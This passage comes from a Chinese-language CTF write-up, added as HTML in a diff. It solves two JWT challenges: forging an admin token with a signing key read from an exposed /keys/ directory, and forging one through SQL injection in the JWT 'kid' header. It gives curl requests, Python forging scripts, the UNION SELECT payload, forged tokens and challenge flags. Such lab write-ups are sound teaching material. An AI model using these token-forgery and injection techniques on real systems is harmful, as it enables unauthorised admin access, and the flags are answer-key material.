+<p><strong>攻击思路：</strong> 发现 <code>/keys/</code> 目录 → 枚举密钥文件 → 获取签名密钥 → 伪造 admin 角色 JWT</p>
+<p><strong>Step 1：分析 JWT 结构</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl -v http://docker.qingcen.net:38658/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>解码 Cookie 中的 JWT：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># Header</span>
+</span></span><span class="line"><span class="cl"><span class="n">echo</span> <span class="s2">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImtleTEifQ&#34;</span> <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">d</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># {&#34;typ&#34;:&#34;JWT&#34;,&#34;alg&#34;:&#34;HS256&#34;,&#34;kid&#34;:&#34;key1&#34;}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">echo</span> <span class="s2">&#34;eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6Imd1ZXN0In0&#34;</span> <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">d</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># {&#34;username&#34;:&#34;guest&#34;,&#34;role&#34;:&#34;guest&#34;}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意头部多了 <code>kid: key1</code> 字段，这是密钥标识符。</p>
+<p><strong>Step 2：发现密钥文件</strong></p>
+<p>通过路径枚举发现 <code>/keys/</code> 目录存在（返回 403），尝试直接访问密钥文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl -s http://docker.qingcen.net:38658/keys/key1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回签名密钥明文：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">QCCTFyyds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>⚠️ <strong>漏洞本质：</strong> 服务端将 JWT 签名密钥存放在 Web 可访问的 <code>/keys/</code> 目录下，且文件无访问控制，任何人都可以直接读取。</p>
+<p><strong>Step 3：伪造 admin JWT</strong></p>
+<p>用泄露的密钥签发 <code>role: admin</code> 的 JWT：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hmac</span><span class="o">,</span> <span class="nn">hashlib</span><span class="o">,</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">b64url_encode</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">header</span> <span class="o">=</span> <span class="n">b64url_encode</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&#34;typ&#34;</span><span class="p">:</span><span class="s2">&#34;JWT&#34;</span><span class="p">,</span><span class="s2">&#34;alg&#34;</span><span class="p">:</span><span class="s2">&#34;HS256&#34;</span><span class="p">,</span><span class="s2">&#34;kid&#34;</span><span class="p">:</span><span class="s2">&#34;key1&#34;</span><span class="p">},</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="s1">&#39;:&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">b64url_encode</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="s2">&#34;role&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span><span class="p">},</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="s1">&#39;:&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">header_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">header</span><span class="si">}</span><span class="s2">.</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 用泄露的密钥签名</span>
+</span></span><span class="line"><span class="cl"><span class="n">sig</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;QCCTFyyds&#34;</span><span class="p">,</span> <span class="n">header_payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">header_payload</span><span class="si">}</span><span class="s2">.</span><span class="si">{</span><span class="n">sig</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>生成的伪造 JWT：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImtleTEifQ.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.bNwwA6GpyrQ5Ng56ShL_huKc_0oHS7d9d2UwwRhbgBc
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 4：携带伪造 JWT 获取 Flag</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl -s -b &#34;boot_id=89acab29344d61a5; auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImtleTEifQ.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.bNwwA6GpyrQ5Ng56ShL_huKc_0oHS7d9d2UwwRhbgBc&#34; http://docker.qingcen.net:38658/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>页面返回&quot;安全审计控制台&quot;，权限显示为 <code>admin</code>，flag 出现在页面中。</p>
+<p><strong>Flag：</strong> <code>flag{4b331b4a-92cd-4a6f-a7a4-8e71370e321a}</code></p>
+<h3 id="ezjwt_3jwt-kid-参数-sql-注入">EZJWT_3（JWT kid 参数 SQL 注入）
+</h3><p><strong>漏洞类型：</strong> JWT Header <code>kid</code> 参数 SQL 注入 → 密钥窃取/绕过签名验证</p>
+<p><strong>题目分析：</strong></p>
+<p>目标页面与前几题相同，是一个&quot;安全审计控制台&quot;，使用 HS256 算法签名的 JWT。但本题的签名密钥存储在 MySQL 数据库中，且 <code>kid</code> 参数存在 SQL 注入漏洞。</p>
+<p>关键点：</p>
+<ul>
+<li>JWT 使用 HS256 算法，头部包含 <code>kid: &quot;main-key&quot;</code> 字段</li>
+<li>签名密钥存储在 MySQL 的 <code>jwt_keys</code> 表中（<code>kid</code> 和 <code>secret</code> 两列）</li>
+<li><code>index.php.bak</code> 备份文件泄露了完整源码</li>
+<li><code>find_secret()</code> 函数直接将 <code>kid</code> 拼接到 SQL 语句中，<strong>未做任何过滤和转义</strong></li>
+</ul>
+<p><strong>源码关键片段（<code>index.php.bak</code>）：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">find_secret</span><span class="p">(</span><span class="nx">mysqli</span> <span class="nv">$db</span><span class="p">,</span> <span class="nx">string</span> <span class="nv">$kid</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT secret FROM jwt_keys WHERE kid = &#39;&#34;</span> <span class="o">.</span> <span class="nv">$kid</span> <span class="o">.</span> <span class="s2">&#34;&#39; LIMIT 1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>$kid</code> 直接来自 JWT Header 中的 <code>kid</code> 字段，用户完全可控。</p>
+<p><strong>攻击思路：</strong> 通过 <code>kid</code> 参数注入 SQL → 用 <code>UNION SELECT</code> 让查询返回一个已知密钥 → 用该密钥伪造 admin 角色的 JWT → 获取 flag</p>
+<p><strong>Step 1：发现备份文件泄露源码</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl http://docker.qingcen.net:39652/index.php.bak
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>源码泄露了数据库连接信息、SQL 查询逻辑以及 flag 文件路径 <code>/flag_bei_conquer_eat_le_bu_zai_zhe_li</code>。</p>
+<p><strong>Step 2：分析 SQL 注入点</strong></p>
+<p><code>find_secret()</code> 中的 SQL 语句：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">secret</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">jwt_keys</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">kid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;$kid&#39;</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">1</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过控制 <code>kid</code> 值，可以注入 <code>UNION SELECT</code> 让查询返回任意字符串作为密钥。</p>
+<p><strong>Step 3：构造 SQL 注入 Payload</strong></p>
+<p>注入 <code>kid = ' UNION SELECT 'mysecret' -- -</code>，使最终 SQL 变为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">secret</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">jwt_keys</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">kid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;mysecret&#39;</span><span class="w"> </span><span class="c1">-- -&#39; LIMIT 1
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>查询将返回 <code>mysecret</code> 作为签名密钥，这是一个我们已知的值。</p>
+<p><strong>Step 4：用注入的密钥伪造 admin JWT</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">json</span><span class="o">,</span> <span class="nn">hmac</span><span class="o">,</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">b64url_encode</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># SQL 注入的 kid 值</span>
+</span></span><span class="line"><span class="cl"><span class="n">sqli_kid</span> <span class="o">=</span> <span class="s2">&#34;&#39; UNION SELECT &#39;mysecret&#39; -- -&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">header</span> <span class="o">=</span> <span class="n">b64url_encode</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&#34;typ&#34;</span><span class="p">:</span><span class="s2">&#34;JWT&#34;</span><span class="p">,</span><span class="s2">&#34;alg&#34;</span><span class="p">:</span><span class="s2">&#34;HS256&#34;</span><span class="p">,</span><span class="s2">&#34;kid&#34;</span><span class="p">:</span><span class="n">sqli_kid</span><span class="p">},</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="s1">&#39;:&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">b64url_encode</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="s2">&#34;role&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span><span class="p">},</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="s1">&#39;:&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">header_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">header</span><span class="si">}</span><span class="s2">.</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 用已知密钥签名</span>
+</span></span><span class="line"><span class="cl"><span class="n">sig</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;mysecret&#34;</span><span class="p">,</span> <span class="n">header_payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">header_payload</span><span class="si">}</span><span class="s2">.</span><span class="si">{</span><span class="n">sig</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 5：携带伪造 JWT 获取 Flag</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl -s -b &#34;token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IicgVU5JT04gU0VMRUNUICdteXNlY3JldCcgLS0gLSJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.HpGYoUHQqe5c0d9soDVGOraGd6egtpKE7mwm9xChdJo&#34; http://docker.qingcen.net:39652/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>页面返回&quot;安全审计控制台&quot;，权限显示为 <code>admin</code>，flag 出现在页面中。</p>
+<p><strong>分析：</strong> 本题综合考察了两个关键点：</p>
+<ol>
+<li><strong>敏感文件泄露</strong> — <code>index.php.bak</code> 泄露了完整 PHP 源码，暴露了 SQL 注入漏洞和数据库结构</li>
+<li><strong>JWT kid SQL 注入</strong> — <code>kid</code> 参数直接拼接到 SQL 查询中，通过 <code>UNION SELECT</code> 注入可控密钥，从而伪造任意角色的 JWT</li>
+</ol>
+<p><strong>Flag：</strong> <code>flag{183315a0-7f7a-4ef6-85d1-cc48b4126a35}</code></p>
+<h2 id="ezpop">EZPOP
 </h2><h3 id="ezpop-1">EZPOP
 </h3><h3 id="ezpop_1">EZPOP_1
 </h3><h3 id="ezpop_2">EZPOP_2
